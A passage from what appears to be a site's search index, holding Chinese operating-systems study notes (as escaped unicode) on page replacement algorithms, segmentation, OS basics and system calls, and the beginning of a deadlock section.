7\uFF0C0\uFF0C1\uFF0C2\uFF0C0\uFF0C3\uFF0C0\uFF0C4\uFF0C2\uFF0C3\uFF0C0\uFF0C3\uFF0C2\uFF0C1\uFF0C2\uFF0C0\uFF0C1\uFF0C7\uFF0C0\uFF0C1
\u5F00\u59CB\u8FD0\u884C\u65F6\uFF0C\u5148\u5C06 7, 0, 1 \u4E09\u4E2A\u9875\u9762\u88C5\u5165\u5185\u5B58\u3002\u5F53\u8FDB\u7A0B\u8981\u8BBF\u95EE\u9875\u9762 2 \u65F6\uFF0C\u4EA7\u751F\u7F3A\u9875\u4E2D\u65AD\uFF0C\u4F1A\u5C06\u9875\u9762 7 \u6362\u51FA\uFF0C\u56E0\u4E3A\u9875\u9762 7 \u518D\u6B21\u88AB\u8BBF\u95EE\u7684\u65F6\u95F4\u6700\u957F\u3002`},{header:"2. \u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528",slug:"_2-\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528",content:`LRU, Least Recently Used \u867D\u7136\u65E0\u6CD5\u77E5\u9053\u5C06\u6765\u8981\u4F7F\u7528\u7684\u9875\u9762\u60C5\u51B5\uFF0C\u4F46\u662F\u53EF\u4EE5\u77E5\u9053\u8FC7\u53BB\u4F7F\u7528\u9875\u9762\u7684\u60C5\u51B5\u3002LRU \u5C06\u6700\u8FD1\u6700\u4E45\u672A\u4F7F\u7528\u7684\u9875\u9762\u6362\u51FA\u3002
\u4E3A\u4E86\u5B9E\u73B0 LRU\uFF0C\u9700\u8981\u5728\u5185\u5B58\u4E2D\u7EF4\u62A4\u4E00\u4E2A\u6240\u6709\u9875\u9762\u7684\u94FE\u8868\u3002\u5F53\u4E00\u4E2A\u9875\u9762\u88AB\u8BBF\u95EE\u65F6\uFF0C\u5C06\u8FD9\u4E2A\u9875\u9762\u79FB\u5230\u94FE\u8868\u8868\u5934\u3002\u8FD9\u6837\u5C31\u80FD\u4FDD\u8BC1\u94FE\u8868\u8868\u5C3E\u7684\u9875\u9762\u662F\u6700\u8FD1\u6700\u4E45\u672A\u8BBF\u95EE\u7684\u3002
\u56E0\u4E3A\u6BCF\u6B21\u8BBF\u95EE\u90FD\u9700\u8981\u66F4\u65B0\u94FE\u8868\uFF0C\u56E0\u6B64\u8FD9\u79CD\u65B9\u5F0F\u5B9E\u73B0\u7684 LRU \u4EE3\u4EF7\u5F88\u9AD8\u3002
4\uFF0C7\uFF0C0\uFF0C7\uFF0C1\uFF0C0\uFF0C1\uFF0C2\uFF0C1\uFF0C2\uFF0C6`},{header:"3. \u6700\u8FD1\u672A\u4F7F\u7528",slug:"_3-\u6700\u8FD1\u672A\u4F7F\u7528",content:`NRU, Not Recently Used \u6BCF\u4E2A\u9875\u9762\u90FD\u6709\u4E24\u4E2A\u72B6\u6001\u4F4D\uFF1AR \u4E0E M\uFF0C\u5F53\u9875\u9762\u88AB\u8BBF\u95EE\u65F6\u8BBE\u7F6E\u9875\u9762\u7684 R=1\uFF0C\u5F53\u9875\u9762\u88AB\u4FEE\u6539\u65F6\u8BBE\u7F6E M=1\u3002\u5176\u4E2D R \u4F4D\u4F1A\u5B9A\u65F6\u88AB\u6E05\u96F6\u3002\u53EF\u4EE5\u5C06\u9875\u9762\u5206\u6210\u4EE5\u4E0B\u56DB\u7C7B\uFF1A R=0\uFF0CM=0
R=0\uFF0CM=1
R=1\uFF0CM=0
R=1\uFF0CM=1 \u5F53\u53D1\u751F\u7F3A\u9875\u4E2D\u65AD\u65F6\uFF0CNRU \u7B97\u6CD5\u968F\u673A\u5730\u4ECE\u7C7B\u7F16\u53F7\u6700\u5C0F\u7684\u975E\u7A7A\u7C7B\u4E2D\u6311\u9009\u4E00\u4E2A\u9875\u9762\u5C06\u5B83\u6362\u51FA\u3002
NRU \u4F18\u5148\u6362\u51FA\u5DF2\u7ECF\u88AB\u4FEE\u6539\u7684\u810F\u9875\u9762\uFF08R=0\uFF0CM=1\uFF09\uFF0C\u800C\u4E0D\u662F\u88AB\u9891\u7E41\u4F7F\u7528\u7684\u5E72\u51C0\u9875\u9762\uFF08R=1\uFF0CM=0\uFF09\u3002`},{header:"4. \u5148\u8FDB\u5148\u51FA",slug:"_4-\u5148\u8FDB\u5148\u51FA",content:`FIFO, First In First Out \u9009\u62E9\u6362\u51FA\u7684\u9875\u9762\u662F\u6700\u5148\u8FDB\u5165\u7684\u9875\u9762\u3002
\u8BE5\u7B97\u6CD5\u4F1A\u5C06\u90A3\u4E9B\u7ECF\u5E38\u88AB\u8BBF\u95EE\u7684\u9875\u9762\u6362\u51FA\uFF0C\u5BFC\u81F4\u7F3A\u9875\u7387\u5347\u9AD8\u3002`},{header:"5. \u7B2C\u4E8C\u6B21\u673A\u4F1A\u7B97\u6CD5",slug:"_5-\u7B2C\u4E8C\u6B21\u673A\u4F1A\u7B97\u6CD5",content:`FIFO \u7B97\u6CD5\u53EF\u80FD\u4F1A\u628A\u7ECF\u5E38\u4F7F\u7528\u7684\u9875\u9762\u7F6E\u6362\u51FA\u53BB\uFF0C\u4E3A\u4E86\u907F\u514D\u8FD9\u4E00\u95EE\u9898\uFF0C\u5BF9\u8BE5\u7B97\u6CD5\u505A\u4E00\u4E2A\u7B80\u5355\u7684\u4FEE\u6539\uFF1A
\u5F53\u9875\u9762\u88AB\u8BBF\u95EE (\u8BFB\u6216\u5199) \u65F6\u8BBE\u7F6E\u8BE5\u9875\u9762\u7684 R \u4F4D\u4E3A 1\u3002\u9700\u8981\u66FF\u6362\u7684\u65F6\u5019\uFF0C\u68C0\u67E5\u6700\u8001\u9875\u9762\u7684 R \u4F4D\u3002\u5982\u679C R \u4F4D\u662F 0\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u9875\u9762\u65E2\u8001\u53C8\u6CA1\u6709\u88AB\u4F7F\u7528\uFF0C\u53EF\u4EE5\u7ACB\u523B\u7F6E\u6362\u6389\uFF1B\u5982\u679C\u662F 1\uFF0C\u5C31\u5C06 R \u4F4D\u6E05 0\uFF0C\u5E76\u628A\u8BE5\u9875\u9762\u653E\u5230\u94FE\u8868\u7684\u5C3E\u7AEF\uFF0C\u4FEE\u6539\u5B83\u7684\u88C5\u5165\u65F6\u95F4\u4F7F\u5B83\u5C31\u50CF\u521A\u88C5\u5165\u7684\u4E00\u6837\uFF0C\u7136\u540E\u7EE7\u7EED\u4ECE\u94FE\u8868\u7684\u5934\u90E8\u5F00\u59CB\u641C\u7D22\u3002`},{header:"6. \u65F6\u949F",slug:"_6-\u65F6\u949F",content:"Clock \u7B2C\u4E8C\u6B21\u673A\u4F1A\u7B97\u6CD5\u9700\u8981\u5728\u94FE\u8868\u4E2D\u79FB\u52A8\u9875\u9762\uFF0C\u964D\u4F4E\u4E86\u6548\u7387\u3002\u65F6\u949F\u7B97\u6CD5\u4F7F\u7528\u73AF\u5F62\u94FE\u8868\u5C06\u9875\u9762\u8FDE\u63A5\u8D77\u6765\uFF0C\u518D\u4F7F\u7528\u4E00\u4E2A\u6307\u9488\u6307\u5411\u6700\u8001\u7684\u9875\u9762\u3002"},{header:"\u5206\u6BB5",slug:"\u5206\u6BB5",content:`\u865A\u62DF\u5185\u5B58\u91C7\u7528\u7684\u662F\u5206\u9875\u6280\u672F\uFF0C\u4E5F\u5C31\u662F\u5C06\u5730\u5740\u7A7A\u95F4\u5212\u5206\u6210\u56FA\u5B9A\u5927\u5C0F\u7684\u9875\uFF0C\u6BCF\u4E00\u9875\u518D\u4E0E\u5185\u5B58\u8FDB\u884C\u6620\u5C04\u3002
\u4E0B\u56FE\u4E3A\u4E00\u4E2A\u7F16\u8BD1\u5668\u5728\u7F16\u8BD1\u8FC7\u7A0B\u4E2D\u5EFA\u7ACB\u7684\u591A\u4E2A\u8868\uFF0C\u6709 4 \u4E2A\u8868\u662F\u52A8\u6001\u589E\u957F\u7684\uFF0C\u5982\u679C\u4F7F\u7528\u5206\u9875\u7CFB\u7EDF\u7684\u4E00\u7EF4\u5730\u5740\u7A7A\u95F4\uFF0C\u52A8\u6001\u589E\u957F\u7684\u7279\u70B9\u4F1A\u5BFC\u81F4\u8986\u76D6\u95EE\u9898\u7684\u51FA\u73B0\u3002 \u5206\u6BB5\u7684\u505A\u6CD5\u662F\u628A\u6BCF\u4E2A\u8868\u5206\u6210\u6BB5\uFF0C\u4E00\u4E2A\u6BB5\u6784\u6210\u4E00\u4E2A\u72EC\u7ACB\u7684\u5730\u5740\u7A7A\u95F4\u3002\u6BCF\u4E2A\u6BB5\u7684\u957F\u5EA6\u53EF\u4EE5\u4E0D\u540C\uFF0C\u5E76\u4E14\u53EF\u4EE5\u52A8\u6001\u589E\u957F\u3002`},{header:"\u6BB5\u9875\u5F0F",slug:"\u6BB5\u9875\u5F0F",content:"\u7A0B\u5E8F\u7684\u5730\u5740\u7A7A\u95F4\u5212\u5206\u6210\u591A\u4E2A\u62E5\u6709\u72EC\u7ACB\u5730\u5740\u7A7A\u95F4\u7684\u6BB5\uFF0C\u6BCF\u4E2A\u6BB5\u4E0A\u7684\u5730\u5740\u7A7A\u95F4\u5212\u5206\u6210\u5927\u5C0F\u76F8\u540C\u7684\u9875\u3002\u8FD9\u6837\u65E2\u62E5\u6709\u5206\u6BB5\u7CFB\u7EDF\u7684\u5171\u4EAB\u548C\u4FDD\u62A4\uFF0C\u53C8\u62E5\u6709\u5206\u9875\u7CFB\u7EDF\u7684\u865A\u62DF\u5185\u5B58\u529F\u80FD\u3002"},{header:"\u5206\u9875\u4E0E\u5206\u6BB5\u7684\u6BD4\u8F83",slug:"\u5206\u9875\u4E0E\u5206\u6BB5\u7684\u6BD4\u8F83",content:"\u5BF9\u7A0B\u5E8F\u5458\u7684\u900F\u660E\u6027\uFF1A\u5206\u9875\u900F\u660E\uFF0C\u4F46\u662F\u5206\u6BB5\u9700\u8981\u7A0B\u5E8F\u5458\u663E\u5F0F\u5212\u5206\u6BCF\u4E2A\u6BB5\u3002 \u5730\u5740\u7A7A\u95F4\u7684\u7EF4\u5EA6\uFF1A\u5206\u9875\u662F\u4E00\u7EF4\u5730\u5740\u7A7A\u95F4\uFF0C\u5206\u6BB5\u662F\u4E8C\u7EF4\u7684\u3002 \u5927\u5C0F\u662F\u5426\u53EF\u4EE5\u6539\u53D8\uFF1A\u9875\u7684\u5927\u5C0F\u4E0D\u53EF\u53D8\uFF0C\u6BB5\u7684\u5927\u5C0F\u53EF\u4EE5\u52A8\u6001\u6539\u53D8\u3002 \u51FA\u73B0\u7684\u539F\u56E0\uFF1A\u5206\u9875\u4E3B\u8981\u7528\u4E8E\u5B9E\u73B0\u865A\u62DF\u5185\u5B58\uFF0C\u4ECE\u800C\u83B7\u5F97\u66F4\u5927\u7684\u5730\u5740\u7A7A\u95F4\uFF1B\u5206\u6BB5\u4E3B\u8981\u662F\u4E3A\u4E86\u4F7F\u7A0B\u5E8F\u548C\u6570\u636E\u53EF\u4EE5\u88AB\u5212\u5206\u4E3A\u903B\u8F91\u4E0A\u72EC\u7ACB\u7684\u5730\u5740\u7A7A\u95F4\u5E76\u4E14\u6709\u52A9\u4E8E\u5171\u4EAB\u548C\u4FDD\u62A4\u3002"}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E6%A6%82%E8%BF%B0.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u6982\u8FF0",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u6982\u8FF0",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF-\u6982\u8FF0",content:`\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u6982\u8FF0 \u57FA\u672C\u7279\u5F81 1. \u5E76\u53D1
2. \u5171\u4EAB
3. \u865A\u62DF
4. \u5F02\u6B65 \u57FA\u672C\u529F\u80FD 1. \u8FDB\u7A0B\u7BA1\u7406
2. \u5185\u5B58\u7BA1\u7406
3. \u6587\u4EF6\u7BA1\u7406
4. \u8BBE\u5907\u7BA1\u7406 \u7CFB\u7EDF\u8C03\u7528
\u5B8F\u5185\u6838\u548C\u5FAE\u5185\u6838 1. \u5B8F\u5185\u6838
2. \u5FAE\u5185\u6838 \u4E2D\u65AD\u5206\u7C7B 1. \u5916\u4E2D\u65AD
2. \u5F02\u5E38
3. \u9677\u5165`},{header:"\u57FA\u672C\u7279\u5F81",slug:"\u57FA\u672C\u7279\u5F81",content:""},{header:"1. \u5E76\u53D1",slug:"_1-\u5E76\u53D1",content:`\u5E76\u53D1\u662F\u6307\u5B8F\u89C2\u4E0A\u5728\u4E00\u6BB5\u65F6\u95F4\u5185\u80FD\u540C\u65F6\u8FD0\u884C\u591A\u4E2A\u7A0B\u5E8F\uFF0C\u800C\u5E76\u884C\u5219\u6307\u540C\u4E00\u65F6\u523B\u80FD\u8FD0\u884C\u591A\u4E2A\u6307\u4EE4\u3002
\u5E76\u884C\u9700\u8981\u786C\u4EF6\u652F\u6301\uFF0C\u5982\u591A\u6D41\u6C34\u7EBF\u3001\u591A\u6838\u5904\u7406\u5668\u6216\u8005\u5206\u5E03\u5F0F\u8BA1\u7B97\u7CFB\u7EDF\u3002
\u64CD\u4F5C\u7CFB\u7EDF\u901A\u8FC7\u5F15\u5165\u8FDB\u7A0B\u548C\u7EBF\u7A0B\uFF0C\u4F7F\u5F97\u7A0B\u5E8F\u80FD\u591F\u5E76\u53D1\u8FD0\u884C\u3002`},{header:"2. \u5171\u4EAB",slug:"_2-\u5171\u4EAB",content:`\u5171\u4EAB\u662F\u6307\u7CFB\u7EDF\u4E2D\u7684\u8D44\u6E90\u53EF\u4EE5\u88AB\u591A\u4E2A\u5E76\u53D1\u8FDB\u7A0B\u5171\u540C\u4F7F\u7528\u3002
\u6709\u4E24\u79CD\u5171\u4EAB\u65B9\u5F0F\uFF1A\u4E92\u65A5\u5171\u4EAB\u548C\u540C\u65F6\u5171\u4EAB\u3002
\u4E92\u65A5\u5171\u4EAB\u7684\u8D44\u6E90\u79F0\u4E3A\u4E34\u754C\u8D44\u6E90\uFF0C\u4F8B\u5982\u6253\u5370\u673A\u7B49\uFF0C\u5728\u540C\u4E00\u65F6\u523B\u53EA\u5141\u8BB8\u4E00\u4E2A\u8FDB\u7A0B\u8BBF\u95EE\uFF0C\u9700\u8981\u7528\u540C\u6B65\u673A\u5236\u6765\u5B9E\u73B0\u4E92\u65A5\u8BBF\u95EE\u3002`},{header:"3. \u865A\u62DF",slug:"_3-\u865A\u62DF",content:`\u865A\u62DF\u6280\u672F\u628A\u4E00\u4E2A\u7269\u7406\u5B9E\u4F53\u8F6C\u6362\u4E3A\u591A\u4E2A\u903B\u8F91\u5B9E\u4F53\u3002
\u4E3B\u8981\u6709\u4E24\u79CD\u865A\u62DF\u6280\u672F\uFF1A\u65F6\uFF08\u65F6\u95F4\uFF09\u5206\u590D\u7528\u6280\u672F\u548C\u7A7A\uFF08\u7A7A\u95F4\uFF09\u5206\u590D\u7528\u6280\u672F\u3002
\u591A\u4E2A\u8FDB\u7A0B\u80FD\u5728\u540C\u4E00\u4E2A\u5904\u7406\u5668\u4E0A\u5E76\u53D1\u6267\u884C\u4F7F\u7528\u4E86\u65F6\u5206\u590D\u7528\u6280\u672F\uFF0C\u8BA9\u6BCF\u4E2A\u8FDB\u7A0B\u8F6E\u6D41\u5360\u7528\u5904\u7406\u5668\uFF0C\u6BCF\u6B21\u53EA\u6267\u884C\u4E00\u5C0F\u4E2A\u65F6\u95F4\u7247\u5E76\u5FEB\u901F\u5207\u6362\u3002
\u865A\u62DF\u5185\u5B58\u4F7F\u7528\u4E86\u7A7A\u5206\u590D\u7528\u6280\u672F\uFF0C\u5B83\u5C06\u7269\u7406\u5185\u5B58\u62BD\u8C61\u4E3A\u5730\u5740\u7A7A\u95F4\uFF0C\u6BCF\u4E2A\u8FDB\u7A0B\u90FD\u6709\u5404\u81EA\u7684\u5730\u5740\u7A7A\u95F4\u3002\u5730\u5740\u7A7A\u95F4\u7684\u9875\u88AB\u6620\u5C04\u5230\u7269\u7406\u5185\u5B58\uFF0C\u5730\u5740\u7A7A\u95F4\u7684\u9875\u5E76\u4E0D\u9700\u8981\u5168\u90E8\u5728\u7269\u7406\u5185\u5B58\u4E2D\uFF0C\u5F53\u4F7F\u7528\u5230\u4E00\u4E2A\u6CA1\u6709\u5728\u7269\u7406\u5185\u5B58\u7684\u9875\u65F6\uFF0C\u6267\u884C\u9875\u9762\u7F6E\u6362\u7B97\u6CD5\uFF0C\u5C06\u8BE5\u9875\u7F6E\u6362\u5230\u5185\u5B58\u4E2D\u3002`},{header:"4. \u5F02\u6B65",slug:"_4-\u5F02\u6B65",content:"\u5F02\u6B65\u6307\u8FDB\u7A0B\u4E0D\u662F\u4E00\u6B21\u6027\u6267\u884C\u5B8C\u6BD5\uFF0C\u800C\u662F\u8D70\u8D70\u505C\u505C\uFF0C\u4EE5\u4E0D\u53EF\u77E5\u7684\u901F\u5EA6\u5411\u524D\u63A8\u8FDB\u3002"},{header:"\u57FA\u672C\u529F\u80FD",slug:"\u57FA\u672C\u529F\u80FD",content:""},{header:"1. \u8FDB\u7A0B\u7BA1\u7406",slug:"_1-\u8FDB\u7A0B\u7BA1\u7406",content:"\u8FDB\u7A0B\u63A7\u5236\u3001\u8FDB\u7A0B\u540C\u6B65\u3001\u8FDB\u7A0B\u901A\u4FE1\u3001\u6B7B\u9501\u5904\u7406\u3001\u5904\u7406\u673A\u8C03\u5EA6\u7B49\u3002"},{header:"2. \u5185\u5B58\u7BA1\u7406",slug:"_2-\u5185\u5B58\u7BA1\u7406",content:"\u5185\u5B58\u5206\u914D\u3001\u5730\u5740\u6620\u5C04\u3001\u5185\u5B58\u4FDD\u62A4\u4E0E\u5171\u4EAB\u3001\u865A\u62DF\u5185\u5B58\u7B49\u3002"},{header:"3. \u6587\u4EF6\u7BA1\u7406",slug:"_3-\u6587\u4EF6\u7BA1\u7406",content:"\u6587\u4EF6\u5B58\u50A8\u7A7A\u95F4\u7684\u7BA1\u7406\u3001\u76EE\u5F55\u7BA1\u7406\u3001\u6587\u4EF6\u8BFB\u5199\u7BA1\u7406\u548C\u4FDD\u62A4\u7B49\u3002"},{header:"4. \u8BBE\u5907\u7BA1\u7406",slug:"_4-\u8BBE\u5907\u7BA1\u7406",content:`\u5B8C\u6210\u7528\u6237\u7684 I/O \u8BF7\u6C42\uFF0C\u65B9\u4FBF\u7528\u6237\u4F7F\u7528\u5404\u79CD\u8BBE\u5907\uFF0C\u5E76\u63D0\u9AD8\u8BBE\u5907\u7684\u5229\u7528\u7387\u3002
\u4E3B\u8981\u5305\u62EC\u7F13\u51B2\u7BA1\u7406\u3001\u8BBE\u5907\u5206\u914D\u3001\u8BBE\u5907\u5904\u7406\u3001\u865B\u62DF\u8BBE\u5907\u7B49\u3002`},{header:"\u7CFB\u7EDF\u8C03\u7528",slug:"\u7CFB\u7EDF\u8C03\u7528",content:`\u5982\u679C\u4E00\u4E2A\u8FDB\u7A0B\u5728\u7528\u6237\u6001\u9700\u8981\u4F7F\u7528\u5185\u6838\u6001\u7684\u529F\u80FD\uFF0C\u5C31\u8FDB\u884C\u7CFB\u7EDF\u8C03\u7528\u4ECE\u800C\u9677\u5165\u5185\u6838\uFF0C\u7531\u64CD\u4F5C\u7CFB\u7EDF\u4EE3\u4E3A\u5B8C\u6210\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/tGPV0.png" width="600)
Linux \u7684\u7CFB\u7EDF\u8C03\u7528\u4E3B\u8981\u6709\u4EE5\u4E0B\u8FD9\u4E9B\uFF1A Task
Commands \u8FDB\u7A0B\u63A7\u5236
fork(); exit(); wait(); \u8FDB\u7A0B\u901A\u4FE1
pipe(); shmget(); mmap(); \u6587\u4EF6\u64CD\u4F5C
open(); read(); write(); \u8BBE\u5907\u64CD\u4F5C
ioctl(); read(); write(); \u4FE1\u606F\u7EF4\u62A4
getpid(); alarm(); sleep(); \u5B89\u5168
chmod(); umask(); chown();`},{header:"\u5B8F\u5185\u6838\u548C\u5FAE\u5185\u6838",slug:"\u5B8F\u5185\u6838\u548C\u5FAE\u5185\u6838",content:""},{header:"1. \u5B8F\u5185\u6838",slug:"_1-\u5B8F\u5185\u6838",content:`\u5B8F\u5185\u6838\u662F\u5C06\u64CD\u4F5C\u7CFB\u7EDF\u529F\u80FD\u4F5C\u4E3A\u4E00\u4E2A\u7D27\u5BC6\u7ED3\u5408\u7684\u6574\u4F53\u653E\u5230\u5185\u6838\u3002
\u7531\u4E8E\u5404\u6A21\u5757\u5171\u4EAB\u4FE1\u606F\uFF0C\u56E0\u6B64\u6709\u5F88\u9AD8\u7684\u6027\u80FD\u3002`},{header:"2. \u5FAE\u5185\u6838",slug:"_2-\u5FAE\u5185\u6838",content:`\u7531\u4E8E\u64CD\u4F5C\u7CFB\u7EDF\u4E0D\u65AD\u590D\u6742\uFF0C\u56E0\u6B64\u5C06\u4E00\u90E8\u5206\u64CD\u4F5C\u7CFB\u7EDF\u529F\u80FD\u79FB\u51FA\u5185\u6838\uFF0C\u4ECE\u800C\u964D\u4F4E\u5185\u6838\u7684\u590D\u6742\u6027\u3002\u79FB\u51FA\u7684\u90E8\u5206\u6839\u636E\u5206\u5C42\u7684\u539F\u5219\u5212\u5206\u6210\u82E5\u5E72\u670D\u52A1\uFF0C\u76F8\u4E92\u72EC\u7ACB\u3002
\u5728\u5FAE\u5185\u6838\u7ED3\u6784\u4E0B\uFF0C\u64CD\u4F5C\u7CFB\u7EDF\u88AB\u5212\u5206\u6210\u5C0F\u7684\u3001\u5B9A\u4E49\u826F\u597D\u7684\u6A21\u5757\uFF0C\u53EA\u6709\u5FAE\u5185\u6838\u8FD9\u4E00\u4E2A\u6A21\u5757\u8FD0\u884C\u5728\u5185\u6838\u6001\uFF0C\u5176\u4F59\u6A21\u5757\u8FD0\u884C\u5728\u7528\u6237\u6001\u3002
\u56E0\u4E3A\u9700\u8981\u9891\u7E41\u5730\u5728\u7528\u6237\u6001\u548C\u6838\u5FC3\u6001\u4E4B\u95F4\u8FDB\u884C\u5207\u6362\uFF0C\u6240\u4EE5\u4F1A\u6709\u4E00\u5B9A\u7684\u6027\u80FD\u635F\u5931\u3002`},{header:"\u4E2D\u65AD\u5206\u7C7B",slug:"\u4E2D\u65AD\u5206\u7C7B",content:""},{header:"1. \u5916\u4E2D\u65AD",slug:"_1-\u5916\u4E2D\u65AD",content:"\u7531 CPU \u6267\u884C\u6307\u4EE4\u4EE5\u5916\u7684\u4E8B\u4EF6\u5F15\u8D77\uFF0C\u5982 I/O \u5B8C\u6210\u4E2D\u65AD\uFF0C\u8868\u793A\u8BBE\u5907\u8F93\u5165/\u8F93\u51FA\u5904\u7406\u5DF2\u7ECF\u5B8C\u6210\uFF0C\u5904\u7406\u5668\u80FD\u591F\u53D1\u9001\u4E0B\u4E00\u4E2A\u8F93\u5165/\u8F93\u51FA\u8BF7\u6C42\u3002\u6B64\u5916\u8FD8\u6709\u65F6\u949F\u4E2D\u65AD\u3001\u63A7\u5236\u53F0\u4E2D\u65AD\u7B49\u3002"},{header:"2. \u5F02\u5E38",slug:"_2-\u5F02\u5E38",content:"\u7531 CPU \u6267\u884C\u6307\u4EE4\u7684\u5185\u90E8\u4E8B\u4EF6\u5F15\u8D77\uFF0C\u5982\u975E\u6CD5\u64CD\u4F5C\u7801\u3001\u5730\u5740\u8D8A\u754C\u3001\u7B97\u672F\u6EA2\u51FA\u7B49\u3002"},{header:"3. \u9677\u5165",slug:"_3-\u9677\u5165",content:"\u5728\u7528\u6237\u7A0B\u5E8F\u4E2D\u4F7F\u7528\u7CFB\u7EDF\u8C03\u7528\u3002"}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E6%AD%BB%E9%94%81.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u6B7B\u9501",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u6B7B\u9501",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF-\u6B7B\u9501",content:`\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u6B7B\u9501 \u5FC5\u8981\u6761\u4EF6
\u5904\u7406\u65B9\u6CD5
\u9E35\u9E1F\u7B56\u7565
\u6B7B\u9501\u68C0\u6D4B\u4E0E\u6B7B\u9501\u6062\u590D 1. \u6BCF\u79CD\u7C7B\u578B\u4E00\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B
2. \u6BCF\u79CD\u7C7B\u578B\u591A\u4E2A\u8D44\u6E90\u7684\u6B7B\u9501\u68C0\u6D4B
3. \u6B7B\u9501\u6062\u590D \u6B7B\u9501\u9884\u9632 1. \u7834\u574F\u4E92\u65A5\u6761\u4EF6
2. \u7834\u574F\u5360\u6709\u548C\u7B49\u5F85\u6761\u4EF6
3. \u7834\u574F\u4E0D\u53EF\u62A2\u5360\u6761\u4EF6
4. \u7834\u574F\u73AF\u8DEF\u7B49\u5F85 \u6B7B\u9501\u907F\u514D 1. \u5B89\u5168\u72B6\u6001
2. \u5355\u4E2A\u8D44\u6E90\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5
3. \u591A\u4E2A\u8D44\u6E90\u7684\u94F6\u884C\u5BB6\u7B97\u6CD5`},{header:"\u5FC5\u8981\u6761\u4EF6",slug:"\u5FC5\u8981\u6761\u4EF6",content:`\u4E92\u65A5\uFF1A\u6BCF\u4E2A\u8D44\u6E90\u8981\u4E48\u5DF2\u7ECF\u5206\u914D\u7ED9\u4E86\u4E00\u4E2A\u8FDB\u7A0B\uFF0C\u8981\u4E48\u5C31\u662F\u53EF\u7528\u7684\u3002
\u5360\u6709\u548C\u7B49\u5F85\uFF1A\u5DF2\u7ECF\u5F97\u5230\u4E86\u67D0\u4E2A\u8D44\u6E90\u7684\u8FDB\u7A0B\u53EF\u4EE5\u518D\u8BF7\u6C42\u65B0\u7684\u8D44\u6E90\u3002
\u4E0D\u53EF\u62A2\u5360\uFF1A\u5DF2\u7ECF\u5206\u914D\u7ED9\u4E00\u4E2A\u8FDB\u7A0B\u7684\u8D44\u6E90\u4E0D\u80FD\u5F3A\u5236\u6027\u5730\u88AB\u62A2\u5360\uFF0C\u5B83\u53EA\u80FD\u88AB\u5360\u6709\u5B83\u7684\u8FDB\u7A0B\u663E\u5F0F\u5730\u91CA\u653E\u3002
\u73AF\u8DEF\u7B49\u5F85\uFF1A\u6709\u4E24\u4E2A\u6216\u8005\u4E24\u4E2A\u4EE5\u4E0A\u7684\u8FDB\u7A0B\u7EC4\u6210\u4E00\u6761\u73AF\u8DEF\uFF0C\u8BE5\u73AF\u8DEF\u4E2D\u7684\u6BCF\u4E2A\u8FDB\u7A0B\u90FD\u5728\u7B49\u5F85\u4E0B\u4E00\u4E2A\u8FDB\u7A0B\u6240\u5360\u6709\u7684\u8D44\u6E90\u3002`},{header:"\u5904\u7406\u65B9\u6CD5",slug:"\u5904\u7406\u65B9\u6CD5",content:`\u4E3B\u8981\u6709\u4EE5\u4E0B\u56DB\u79CD\u65B9\u6CD5\uFF1A \u9E35\u9E1F\u7B56\u7565
\u6B7B\u9501\u68C0\u6D4B\u4E0E\u6B7B\u9501\u6062\u590D
\u6B7B\u9501\u9884\u9632
\u6B7B\u9501\u907F\u514D`},{header:"\u9E35\u9E1F\u7B56\u7565",slug:"\u9E35\u9E1F\u7B56\u7565",content:`\u628A\u5934\u57CB\u5728\u6C99\u5B50\u91CC\uFF0C\u5047\u88C5\u6839\u672C\u6CA1\u53D1\u751F\u95EE\u9898\u3002
\u56E0\u4E3A\u89E3\u51B3\u6B7B\u9501\u95EE\u9898\u7684\u4EE3\u4EF7\u5F88\u9AD8\uFF0C\u56E0\u6B64\u9E35\u9E1F\u7B56\u7565\u8FD9\u79CD\u4E0D\u91C7\u53D6\u4EFB\u52A1\u63AA\u65BD\u7684\u65B9\u6848\u4F1A\u83B7\u5F97\u66F4\u9AD8\u7684\u6027\u80FD\u3002
\u5F53\u53D1\u751F\u6B7B\u9501\u65F6\u4E0D\u4F1A\u5BF9\u7528\u6237\u9020\u6210\u591A\u5927\u5F71\u54CD\uFF0C\u6216\u53D1\u751F\u6B7B\u9501\u7684\u6982\u7387\u5F88\u4F4E\uFF0C\u53EF\u4EE5\u91C7\u7528\u9E35\u9E1F\u7B56\u7565\u3002
\u5927\u591A\u6570\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u5305\u62EC Unix\uFF0CLinux \u548C Windows\uFF0C\u5904\u7406\u6B7B\u9501\u95EE\u9898\u7684\u529E\u6CD5\u4EC5\u4EC5\u662F\u5FFD\u7565\u5B83\u3002`},{header:"\u6B7B\u9501\u68C0\u6D4B\u4E0E\u6B7B\u9501\u6062\u590D",slug:"\u6B7B\u9501\u68C0\u6D4B\u4E0E\u6B7B\u9501\u6062\u590D",content:"\u4E0D\u8BD5\u56FE\u963B\u6B62\u6B7B\u9501\uFF0C\u800C\u662F\u5F53\u68C0\u6D4B\u5230\u6B7B\u9501\u53D1\u751F\u65F6\uFF0C\u91C7\u53D6\u63AA\u65BD\u8FDB\u884C\u6062\u590D\u3002"},{header:"1. 